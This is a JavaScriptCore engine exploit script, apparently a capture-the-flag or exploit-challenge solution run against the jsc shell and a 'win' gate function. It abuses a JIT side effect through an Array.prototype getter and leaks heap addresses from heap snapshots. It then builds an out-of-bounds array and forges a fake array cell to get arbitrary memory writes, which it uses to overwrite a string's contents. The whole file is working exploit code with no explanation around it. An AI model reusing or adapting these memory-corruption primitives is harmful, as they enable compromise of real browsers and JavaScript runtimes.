let trigger = false;
let stash = {};
let h = { jac: 0x4141 };
let marker0 = 2 + 0x101 * Number.EPSILON * 2;
let marker1 = 2 + 0x102 * Number.EPSILON * 2;
let marker2 = 2 + 0x103 * Number.EPSILON * 2;
let marker3 = 2 + 0x104 * Number.EPSILON * 2;
let marker4 = 2 + 0x105 * Number.EPSILON * 2;
let marker5 = 2 + 0x106 * Number.EPSILON * 2;
let marker6 = 2 + 0x107 * Number.EPSILON * 2;
let marker7 = 2 + 0x108 * Number.EPSILON * 2;
let lazyCarrier;
function makeLazyCarrier() {
    return [11.1,12.2,13.3,14.4,15.5,16.6,17.7,18.8];
}

function pivot() {
    if (!trigger)
        return;
    Object.defineProperty(Array.prototype, 0, {
        get() { return 42; }, set(_) {}, configurable: true
    });
}
noInline(pivot);

function opt(escape) {
    let a0 = new Array(8); a0[2]=h;a0[3]=h;a0[4]=h;a0[5]=h;a0[6]=h;a0[7]=marker0;
    let a1 = new Array(8); a1[2]=h;a1[3]=h;a1[4]=h;a1[5]=h;a1[6]=h;a1[7]=marker1;
    let a2 = new Array(8); a2[2]=h;a2[3]=h;a2[4]=h;a2[5]=h;a2[6]=h;a2[7]=marker2;
    let a3 = new Array(8); a3[2]=h;a3[3]=h;a3[4]=h;a3[5]=h;a3[6]=h;a3[7]=marker3;
    let a4 = new Array(8); a4[2]=h;a4[3]=h;a4[4]=h;a4[5]=h;a4[6]=h;a4[7]=marker4;
    let a5 = new Array(8); a5[2]=h;a5[3]=h;a5[4]=h;a5[5]=h;a5[6]=h;a5[7]=marker5;
    let a6 = new Array(8); a6[2]=h;a6[3]=h;a6[4]=h;a6[5]=h;a6[6]=h;a6[7]=marker6;
    let a7 = new Array(8); a7[2]=h;a7[3]=h;a7[4]=h;a7[5]=h;a7[6]=h;a7[7]=marker7;
    pivot();
    if (escape) {
        stash.a0=a0;stash.a1=a1;stash.a2=a2;stash.a3=a3;
        stash.a4=a4;stash.a5=a5;stash.a6=a6;stash.a7=a7;
        return a0;
    }
    return isFinalTier();
}
noInline(opt);

let fillerStrings = new Array(100000);
for (let i = 0; i < fillerStrings.length; ++i)
    fillerStrings[i] = String.fromCharCode(65 + (i % 26), 66 + (i % 25), 67 + (i % 24)) + i;
let target = String.fromCharCode(104,101,108,108,111,33,33,33);
let pwnedString = String.fromCharCode(112,119,110,101,100,33,33,33);
let worldString = String.fromCharCode(119,111,114,108,100,33,33,33);
let rw = new Uint8Array(16);
let conversionBuffer = new ArrayBuffer(8);
let conversionFloat = new Float64Array(conversionBuffer);
let conversionInt = new BigUint64Array(conversionBuffer);
let victim = new Array(8);
for (let i = 0; i < 8; ++i)
    victim[i] = i + 0.25;
let anchor = ["JAC_ANCHOR_5f932b", "JAC_B", "JAC_C", "JAC_D", "JAC_E", "JAC_F", "JAC_G", "JAC_H"];
fillerStrings = null;
function snapshotAddresses() {
    let s = JSON.parse(generateHeapSnapshotForGCDebugging());
    let nodes = {};
    let wrapped = {};
    let classes = {};
    let result = {};
    for (let i = 0; i < s.nodes.length; i += 7) {
        nodes[s.nodes[i]] = s.nodes[i + 5];
        wrapped[s.nodes[i]] = s.nodes[i + 6];
        classes[s.nodes[i]] = s.nodeClassNames[s.nodes[i + 2]];
    }
    let victimNode = 0;
    let anchorNode = 0;
    let rwNode = 0;
    for (let i = 0; i < s.edges.length; i += 4) {
        let type = s.edges[i + 2];
        let extra = s.edges[i + 3];
        if (type !== 1 && type !== 3)
            continue;
        let name = s.edgeNames[extra];
        if (name === "h" || name === "target" || name === "pwnedString" || name === "worldString" || name === "rw" || name === "victim" || name === "anchor") {
            result[name] = nodes[s.edges[i + 1]];
            if (name === "victim")
                victimNode = s.edges[i + 1];
            if (name === "anchor")
                anchorNode = s.edges[i + 1];
            if (name === "rw")
                rwNode = s.edges[i + 1];
        }
    }
    print("rw-node address=" + nodes[rwNode] + " wrapped=" + wrapped[rwNode] + " class=" + classes[rwNode]);
    for (let i = 0; i < s.edges.length; i += 4) {
        if (s.edges[i] === victimNode) {
            let nid = s.edges[i + 1];
            print("victim-edge class=" + classes[nid] + " address=" + nodes[nid]);
        }
        if (s.edges[i] === victimNode && classes[s.edges[i + 1]] === "Cell Butterfly")
            result.victimButterfly = nodes[s.edges[i + 1]];
        if (s.edges[i] === anchorNode && classes[s.edges[i + 1]] === "Cell Butterfly")
            result.anchorButterfly = nodes[s.edges[i + 1]];
    }
    return result;
}
let leaked = snapshotAddresses();
print("snap_h=" + leaked.h);
print("snap_target=" + leaked.target);
print("snap_pwned=" + leaked.pwnedString);
print("snap_world=" + leaked.worldString);
print("snap_rw=" + leaked.rw);
print("snap_victim=" + leaked.victim);
print("snap_victim_butterfly=" + leaked.victimButterfly);
print("snap_anchor_butterfly=" + leaked.anchorButterfly);

function stashed(id) {
    switch (id) {
    case 0: return stash.a0;
    case 1: return stash.a1;
    case 2: return stash.a2;
    case 3: return stash.a3;
    case 4: return stash.a4;
    case 5: return stash.a5;
    case 6: return stash.a6;
    default: return stash.a7;
    }
}

function markerFor(id) {
    switch (id) {
    case 0: return marker0;
    case 1: return marker1;
    case 2: return marker2;
    case 3: return marker3;
    case 4: return marker4;
    case 5: return marker5;
    case 6: return marker6;
    default: return marker7;
    }
}

function idWithLength(length) {
    for (let i = 0; i < 8; ++i) {
        if (stashed(i).length === length)
            return i;
    }
    return -1;
}

function floatForRaw(raw) {
    conversionInt[0] = raw - 0x2000000000000n;
    return conversionFloat[0];
}

let oob;
let oobBase;
let backupOOB;
let backupBase;
let order = {};
function setupOOB() {
    order.r0 = idWithLength(8);
    order.r1 = idWithLength(0x101 + order.r0);
    order.r2 = idWithLength(0x101 + order.r1);
    order.r3 = idWithLength(0x101 + order.r2);
    order.r4 = idWithLength(0x101 + order.r3);
    order.r5 = idWithLength(0x101 + order.r4);
    order.r6 = idWithLength(0x101 + order.r5);
    order.r7 = idWithLength(0x101 + order.r6);
    oob = stashed(order.r1);
    let targetAddress = BigInt(leaked.target);
    let candidateA = targetAddress + 0x5960n + 0x50n;
    let candidateB = targetAddress + 0x9960n + 0x50n;
    function probe(base) {
        let index = Number((BigInt(leaked.victim) - (base + 24n)) / 8n);
        return typeof oob[index];
    }
    let probeA = probe(candidateA);
    let probeB = probe(candidateB);
    print("base-probes=" + probeA + "," + probeB);
    oobBase = probeA === "number" ? candidateA : candidateB;
    backupOOB = stashed(order.r2);
    backupBase = oobBase + 0x50n;
    print("chain=" + order.r0 + "->" + order.r1 + "->" + order.r2 + "->" + order.r3 + "->" + order.r4 + "->" + order.r5 + "->" + order.r6 + "->" + order.r7);
}

function writeRaw(address, raw) {
    let index = Number((address - (oobBase + 24n)) / 8n);
    Object.defineProperty(oob, index, {
        value: floatForRaw(raw), writable: true, enumerable: true, configurable: true
    });
}

function writeValue(address, value) {
    let index = Number((address - (oobBase + 24n)) / 8n);
    Object.defineProperty(oob, index, {
        value: value, writable: true, enumerable: true, configurable: true
    });
}

let forgedCell;
let rawArray;
function sanitizeArrays() {
    delete stashed(order.r6)[7];
    delete stashed(order.r5)[7];
    delete stashed(order.r4)[7];
    delete stashed(order.r3)[7];
    delete stashed(order.r2)[7];
    delete stashed(order.r1)[7];
    delete stashed(order.r0)[7];
}

function snapshotStashCells() {
    let s = JSON.parse(generateHeapSnapshotForGCDebugging());
    let nodes = {};
    let result = {};
    for (let i = 0; i < s.nodes.length; i += 7)
        nodes[s.nodes[i]] = s.nodes[i + 5];
    for (let i = 0; i < s.edges.length; i += 4) {
        let type = s.edges[i + 2];
        let extra = s.edges[i + 3];
        if (type !== 1)
            continue;
        let name = s.edgeNames[extra];
        if (name === "a0" || name === "a1" || name === "a2" || name === "a3" || name === "a4" || name === "a5" || name === "a6" || name === "a7")
            result[name] = nodes[s.edges[i + 1]];
    }
    return result;
}

function stashCell(cells, id) {
    switch (id) {
    case 0: return cells.a0;
    case 1: return cells.a1;
    case 2: return cells.a2;
    case 3: return cells.a3;
    case 4: return cells.a4;
    case 5: return cells.a5;
    case 6: return cells.a6;
    default: return cells.a7;
    }
}

function forgeDoubleArray() {
    forgedCell = BigInt(leaked.victim);
    if (forgedCell <= oobBase + 24n)
        throw new Error("retry: victim below OOB");
    writeValue(forgedCell + 8n, pwnedString);
    writeRaw(forgedCell, 0x01082907010024e0n);
    rawArray = victim;
}

function redirectRawArray(value) {
    writeValue(forgedCell + 8n, value);
}

function copyStringImpl(sourceString) {
    redirectRawArray(sourceString);
    let rawImpl = rawArray[1];
    conversionFloat[0] = rawImpl;
    print("rawImpl=0x" + conversionInt[0].toString(16));
    redirectRawArray(target);
    rawArray[1] = rawImpl;
    print("targetNow=" + target);
}

for (let i = 0; i < 2000000; ++i) {
    if (opt(false)) {
        print("finalAt=" + i);
        break;
    }
}

let calls = 0;
try {
    win(target, function () {
        ++calls;
        if (calls === 1) {
            trigger = true;
            opt(true);
            lazyCarrier = makeLazyCarrier();
            print("lengths=" + stash.a0.length + "," + stash.a1.length + "," + stash.a2.length + "," + stash.a3.length + "," + stash.a4.length + "," + stash.a5.length + "," + stash.a6.length + "," + stash.a7.length);
            setupOOB();
            forgeDoubleArray();
            copyStringImpl(pwnedString);
        } else {
            copyStringImpl(worldString);
        }
    });
} catch (e) {
    print("gate=" + e);
}
